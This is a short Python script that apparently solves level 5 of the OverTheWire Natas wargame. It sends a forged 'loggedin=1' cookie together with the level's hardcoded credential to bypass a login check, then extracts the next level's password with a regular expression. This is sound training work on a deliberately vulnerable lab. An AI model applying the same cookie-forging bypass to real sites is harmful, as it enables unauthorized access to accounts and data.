# Vulnerability: Cookie Manipulation

import requests
import re
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'


# Setting cookie to tell the server that we are logged in
cookie = {'loggedin': '1'}


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Make a GET request to the URL with basic authentication using the provided credentials
resp = requests.get(url=url, auth=(username, password), cookies=cookie)


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')


# Extract password for the next level using Regular Expressions
print(re.findall('Access granted. (.*)', soup.text)[0])
